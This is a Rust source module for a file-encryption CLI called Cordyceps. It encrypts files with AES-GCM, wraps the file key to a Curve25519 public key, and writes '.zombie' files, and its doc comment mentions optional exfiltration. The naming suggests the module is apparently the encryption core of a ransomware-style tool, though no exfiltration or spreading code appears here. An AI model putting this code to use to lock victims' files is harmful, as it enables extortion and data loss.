//! Cryptographic operations for file encryption and decryption.
//!
//! This module contains the core logic for encrypting and decrypting files,
//! as used by the CLI interface. It defines the encryption and decryption
//! routines, and is responsible for handling cryptographic workflows,
//! such as file processing, key usage, and optional exfiltration.

use std::{
    fs::{File, read_to_string},
    io::{self, Read, Write},
    path::{Path, PathBuf},
};

use aes_gcm::{
    Aes256Gcm,
    aead::{Aead, KeyInit, Nonce},
};
use base64::{Engine, engine::general_purpose::STANDARD_NO_PAD};
use hkdf::Hkdf;
use log::{debug, info};
use rand::{RngCore, rngs::OsRng};
use x25519_dalek::{EphemeralSecret, PublicKey, StaticSecret};

use crate::error::CryptoError;

/// Encrypted files extension.
pub const EXTENSION: &str = "zombie";

/// Magic bytes to identify Cordyceps encrypted files
const MAGIC_BYTES: &[u8; 4] = b"CORD";

/// .zombie file format version
const FILE_FORMAT_VERSION: u8 = 0x01;

/// Check `docs/zombie_header.md` for more information on this header
struct ZombieHeader {
    ephemeral_public_key: PublicKey,
    encrypted_file_aes_key_with_tag: [u8; 48],
    key_enc_aes_nonce: Nonce<Aes256Gcm>,
    file_aes_nonce: Nonce<Aes256Gcm>,
}

impl ZombieHeader {
    /// Writes the header to any stream that implements `io::Write`.
    fn write_to<W: Write>(&self, mut writer: W) -> Result<(), io::Error> {
        writer.write_all(MAGIC_BYTES)?;
        writer.write_all(&[FILE_FORMAT_VERSION])?;
        writer.write_all(self.ephemeral_public_key.as_bytes())?;
        writer.write_all(&self.encrypted_file_aes_key_with_tag)?;
        writer.write_all(self.key_enc_aes_nonce.as_slice())?;
        writer.write_all(self.file_aes_nonce.as_slice())?;
        Ok(())
    }

    /// Reads a header from any stream that implements `io::Read`.
    fn from_reader<R: Read>(mut reader: R) -> Result<Self, CryptoError> {
        let mut magic_read = [0u8; 4];
        reader.read_exact(&mut magic_read).map_err(|_| {
            CryptoError::InvalidFileFormat("Failed to read magic bytes".to_string())
        })?;
        if magic_read != *MAGIC_BYTES {
            return Err(CryptoError::InvalidFileFormat(
                "Invalid magic bytes".to_string(),
            ));
        }

        let mut version_read = [0u8; 1];
        reader.read_exact(&mut version_read).map_err(|_| {
            CryptoError::InvalidFileFormat("Failed to read version byte".to_string())
        })?;
        if version_read[0] != FILE_FORMAT_VERSION {
            return Err(CryptoError::InvalidFileFormat(
                "Unsupported version".to_string(),
            ));
        }

        let mut ephemeral_public_key_bytes = [0u8; 32];
        reader
            .read_exact(&mut ephemeral_public_key_bytes)
            .map_err(|_| {
                CryptoError::InvalidFileFormat("Failed to read ephemeral public key".to_string())
            })?;

        let mut encrypted_file_aes_key_with_tag = [0u8; 48];
        reader
            .read_exact(&mut encrypted_file_aes_key_with_tag)
            .map_err(|_| {
                CryptoError::InvalidFileFormat("Failed to read encrypted AES key".to_string())
            })?;

        let mut key_enc_aes_nonce_bytes = [0u8; 12];
        reader
            .read_exact(&mut key_enc_aes_nonce_bytes)
            .map_err(|_| {
                CryptoError::InvalidFileFormat(
                    "Failed to read AES nonce for key encapsulation".to_string(),
                )
            })?;

        let mut file_aes_nonce_bytes = [0u8; 12];
        reader.read_exact(&mut file_aes_nonce_bytes).map_err(|_| {
            CryptoError::InvalidFileFormat("Failed to read AES nonce for file content".to_string())
        })?;

        Ok(Self {
            ephemeral_public_key: PublicKey::from(ephemeral_public_key_bytes),
            encrypted_file_aes_key_with_tag,
            key_enc_aes_nonce: *Nonce::<Aes256Gcm>::from_slice(&key_enc_aes_nonce_bytes),
            file_aes_nonce: *Nonce::<Aes256Gcm>::from_slice(&file_aes_nonce_bytes),
        })
    }
}

/// Encrypts a file using a 256-bit AES-GCM key for content and an ECIES-like
/// scheme for AES key encapsulation using Curve25519 (via x25519-dalek).
///
/// The encrypted file will have a `.zombie` extension and its header will
/// include:
/// - Magic bytes--`CORD`
/// - File format version
/// - Ephemeral public key--generated during encryption
/// - Encrypted AES key + GCM tag--encrypted with AES-GCM with a derived key
///   from ECDH
/// - AES nonce for key encapsulation
/// - AES nonce for file content encryption
///
/// Note: GCM tags are concatenated with their respective ciphertexts
/// by `aes_gcm`.
///
/// # Arguments
/// - `path`: The path of the file to be encrypted.
/// - `public_key`: The main public key in x25519_dalek::PublicKey type.
///
/// # Returns
/// A `Result` containing the path to the newly created `.zombie` file on
/// success, or a `CryptoError` if encryption fails.
pub fn encrypt(path: &Path, public_key: &PublicKey) -> Result<PathBuf, CryptoError> {
    info!("Starting encryption for file: {:?}", path);

    // 1. Read file content
    let mut file = File::open(path)?;
    let mut plaintext = Vec::new();
    file.read_to_end(&mut plaintext)?; // TODO: read file by chunks
    debug!("Read {} bytes from {:?}", plaintext.len(), path);

    // 2. Generate random AES key and nonce for file content encryption
    let mut file_aes_key_bytes = [0u8; 32]; // 32-byte long AES key
    OsRng.try_fill_bytes(&mut file_aes_key_bytes)?;
    let file_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&file_aes_key_bytes);
    let cipher_file_aes_gcm = Aes256Gcm::new(file_aes_key);

    let mut file_aes_nonce_bytes = [0u8; 12]; // 12-byte long nonce
    OsRng.try_fill_bytes(&mut file_aes_nonce_bytes)?;
    let file_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&file_aes_nonce_bytes);
    debug!("Generated AES key and nonce for file content");

    // 3. Encrypt file content with AES-GCM
    let ciphertext_with_tag = cipher_file_aes_gcm
        .encrypt(file_aes_nonce, plaintext.as_ref())
        // map_err is used to convert the error type, as aes_gcm::aead::Error
        // does not implement the std::error::Error trait needed by thiserror.
        .map_err(|e| CryptoError::Encryption(format!("File content encryption failed: {:?}", e)))?;
    debug!(
        "File content encrypted. Combined ciphertext+tag size: {}",
        ciphertext_with_tag.len()
    );

    // 4. ECIES-like key encapsulation for the AES key
    let ephemeral_private = EphemeralSecret::random_from_rng(OsRng);
    let ephemeral_public = PublicKey::from(&ephemeral_private);
    debug!("Generated ephemeral Curve25519 key pair");

    let shared_secret = ephemeral_private.diffie_hellman(public_key);
    debug!("Derived shared secret using ECDH");

    // Use HKDF to derive an AES key for encrypting the file_aes_key
    let hkdf = Hkdf::<sha2::Sha256>::new(None, shared_secret.as_bytes());
    let mut key_enc_aes_key_derived_bytes = [0u8; 32];
    hkdf.expand(
        b"key_encapsulation_aes_key_derivation",
        &mut key_enc_aes_key_derived_bytes,
    )
    .map_err(|_| CryptoError::KdfError)?;
    let key_enc_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_enc_aes_key_derived_bytes);
    let cipher_key_enc_aes_gcm = Aes256Gcm::new(key_enc_aes_key);

    let mut key_enc_aes_nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut key_enc_aes_nonce_bytes);
    let key_enc_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&key_enc_aes_nonce_bytes);
    debug!("Derived AES key and nonce for key encapsulation");

    // Encrypt the file_aes_key_bytes with the derived AES key
    let encrypted_file_aes_key_with_tag_vec = cipher_key_enc_aes_gcm
        .encrypt(key_enc_aes_nonce, file_aes_key_bytes.as_ref())
        .map_err(|e| CryptoError::Encryption(format!("AES key encryption failed: {:?}", e)))?;
    debug!("AES key encrypted");

    let encrypted_file_aes_key_with_tag: [u8; 48] = encrypted_file_aes_key_with_tag_vec
        .try_into()
        .map_err(|_| {
            CryptoError::Encryption("Failed to convert encrypted key vector to array".to_string())
        })?;

    // 5. .zombie file creation and opening for writing
    let mut new_path = path.as_os_str().to_owned();
    new_path.push(format!(".{}", EXTENSION));
    let zombie_path = PathBuf::from(new_path);

    info!("Creating encrypted file: {:?}", zombie_path);
    let mut output_file = File::create(&zombie_path)?;

    // 6. Write the header to the .zombie file
    let header = ZombieHeader {
        ephemeral_public_key: ephemeral_public,
        encrypted_file_aes_key_with_tag,
        key_enc_aes_nonce: *key_enc_aes_nonce,
        file_aes_nonce: *file_aes_nonce,
    };
    header.write_to(&mut output_file)?;
    debug!("Wrote encrypted file header");

    // 7. Write the content ciphertext (with tag)
    output_file.write_all(&ciphertext_with_tag)?;
    debug!("File content written to encrypted file");

    Ok(zombie_path)
}

/// Decrypts a `.zombie` file.
/// Requires the corresponding private key to the main public key used
/// during encryption.
///
/// The function reads the header from the `.zombie` file to extract:
/// - Ephemeral public key
/// - Encrypted AES key + GCM tag (file content)
/// - AES nonce for key encapsulation
/// - AES nonce for file content encryption
///
///   Note: GCM tags are concatenated with their respective ciphertexts
///   by `aes_gcm`.
///
/// # Arguments:
/// - `path`: A reference to the path of the `.zombie` file to be decrypted.
/// - `private_key`: The private key to decrypt files in
///   `x25519_dalek::StaticSecret` format.
///
/// # Returns
/// A `Result` containing the path to the newly created decrypted file on
/// success, or a `CryptoError` if decryption fails.
pub fn decrypt(path: &Path, private_key: &StaticSecret) -> Result<PathBuf, CryptoError> {
    info!("Starting decryption for file: {:?}", path);

    // 1. Read the .zombie file and parse the header
    let mut encrypted_file = File::open(path)?;
    let header = ZombieHeader::from_reader(&mut encrypted_file)?;
    debug!("Parsed .zombie header from {:?}", path);

    // 2. Read the rest of the file (ciphertext)
    let mut file_content_ciphertext_with_tag = Vec::new();
    encrypted_file.read_to_end(&mut file_content_ciphertext_with_tag)?;
    debug!(
        "Read ciphertext+tag. Size: {}",
        file_content_ciphertext_with_tag.len()
    );

    // 3. ECIES-like decapsulation for the AES key
    let shared_secret = private_key.diffie_hellman(&header.ephemeral_public_key);
    debug!("Derived shared secret with ECDH");

    let hkdf = Hkdf::<sha2::Sha256>::new(None, shared_secret.as_bytes());
    let mut key_enc_aes_key_derived_bytes = [0u8; 32];
    hkdf.expand(
        b"key_encapsulation_aes_key_derivation",
        &mut key_enc_aes_key_derived_bytes,
    )
    .map_err(|_| CryptoError::KdfError)?;
    let key_enc_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_enc_aes_key_derived_bytes);
    let cipher_key_enc_aes_gcm = Aes256Gcm::new(key_enc_aes_key);
    debug!("Derived AES key for key encapsulation decryption");

    let file_aes_key_bytes = cipher_key_enc_aes_gcm
        .decrypt(
            &header.key_enc_aes_nonce,
            header.encrypted_file_aes_key_with_tag.as_ref(),
        )
        .map_err(|e| {
            if e == aes_gcm::aead::Error {
                CryptoError::AuthenticationTag
            } else {
                CryptoError::Decryption(format!("AES key decryption failed: {:?}", e))
            }
        })?;
    let file_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&file_aes_key_bytes);
    let cipher_file_aes_gcm = Aes256Gcm::new(file_aes_key);
    debug!("AES key decrypted");

    // 4. Decrypt file content (ciphertext) with AES
    let plaintext = cipher_file_aes_gcm
        .decrypt(
            &header.file_aes_nonce,
            file_content_ciphertext_with_tag.as_ref(),
        )
        .map_err(|e| {
            if e == aes_gcm::aead::Error {
                CryptoError::AuthenticationTag
            } else {
                CryptoError::Decryption(format!("File content decryption failed: {:?}", e))
            }
        })?;
    debug!(
        "File content decrypted. Plaintext size: {}",
        plaintext.len()
    );

    // 5. Construct the decrypted file path
    let mut decrypted_path = path.to_path_buf();
    decrypted_path.set_extension("");
    info!("Creating decrypted file: {:?}", decrypted_path);

    // 6. Write decrypted content to the new file
    let mut output_file = File::create(&decrypted_path)?;
    output_file.write_all(&plaintext)?;
    info!("Decrypted content written to file");

    Ok(decrypted_path)
}

/// Generates a new 32-byte (256-bit) Curve25519 key pair.
///
/// Both the private and public keys are Base64-encoded for easier storage and
/// sharing.
///
/// # Returns
/// A `Result` with a `[u8; 32]` tuple with private and public keys on success
/// or a `CryptoError` if key generation or file saving fails.
pub fn generate_keypair() -> Result<([u8; 32], [u8; 32]), CryptoError> {
    info!("Generating new main key pair");

    let private_key = StaticSecret::random_from_rng(OsRng);
    let public_key: PublicKey = (&private_key).into();

    Ok((private_key.to_bytes(), public_key.to_bytes()))
}

/// Encodes a byte slice into a Base64 string.
///
/// This function takes a byte slice and encodes it into a standard Base64
/// string using the `STANDARD_NO_PAD` engine. This is a common choice for
/// cryptographic keys or hashes as it omits the trailing padding characters
///  (`=`).
///
/// # Arguments
/// - `key_bytes`: The byte slice (`&[u8]`) to be encoded.
///
/// # Returns
/// A `String` containing the Base64-encoded representation of the input bytes.
pub fn b64_encode(key_bytes: &[u8]) -> String {
    STANDARD_NO_PAD.encode(key_bytes)
}

/// Decodes a Base64 string into a byte vector.
///
/// This function decodes a Base64 string using the `STANDARD` engine, which
/// can successfully decode both padded and unpadded Base64 strings. It
/// returns an `AppError` if the input string contains invalid Base64
/// characters.
///
/// The function assures to return a fixed-length array of 32 bytes because its
/// the expected input for the encryption function.
///
/// # Arguments
/// - `key_b64`: The Base64-encoded string slice (`&str`) to be decoded.
///
/// # Returns
/// A `Result` containing the decoded bytes ([u8; 32]) on success or a
/// `CryptoError` if the decoding fails.
pub fn b64_decode(key_b64: &str) -> Result<[u8; 32], CryptoError> {
    let decoded_vec = STANDARD_NO_PAD.decode(key_b64)?;

    if decoded_vec.len() != 32 {
        return Err(CryptoError::InvalidKeyLength);
    }

    let fixed_array: [u8; 32] = decoded_vec
        .try_into()
        .map_err(|_| CryptoError::InvalidKeyLength)?;
    Ok(fixed_array)
}

/// Loads a Base64-encoded private key from a file and returns a
/// `StaticSecret`.
///
/// Reads the file at the given path, decodes its Base64 contents, and converts
/// the result into a 32-byte `StaticSecret` used for cryptographic operations.
///
/// # Arguments
/// - `path`: Path to the Base64-encoded private key file.
///
/// # Returns
/// A `Result` containing the `StaticSecret` on success, or a `CryptoError` if
/// the file cannot be read, decoding fails, or the key is not 32 bytes long.
pub fn load_private_key(key: &Path) -> Result<StaticSecret, CryptoError> {
    let key_b64 = read_to_string(key)?;
    let key_bytes = b64_decode(key_b64.trim())?;
    // let key_array =
    //     <[u8; 32]>::try_from(key_bytes.as_slice()).map_err(|_| CryptoError::InvalidKeyLength)?;
    Ok(StaticSecret::from(key_bytes))
}

/// Loads a Base64-encoded public key from a file and returns a `PublicKey`.
///
/// Reads the file at the given path, decodes its Base64 contents, and converts
/// the result into a 32-byte `PublicKey` used for cryptographic operations.
///
/// # Arguments
/// - `path`: Path to the Base64-encoded public key file.
///
/// # Returns
/// A `Result` containing the `PublicKey` on success, or a `CryptoError` if
/// the file cannot be read, decoding fails, or the key is not 32 bytes long.
pub fn load_public_key(key: &Path) -> Result<PublicKey, CryptoError> {
    let key_b64 = read_to_string(key)?;
    let key_bytes = b64_decode(key_b64.trim())?;
    // let key_array =
    //     <[u8; 32]>::try_from(key_bytes.as_slice()).map_err(|_| CryptoError::InvalidKeyLength)?;
    Ok(PublicKey::from(key_bytes))
}
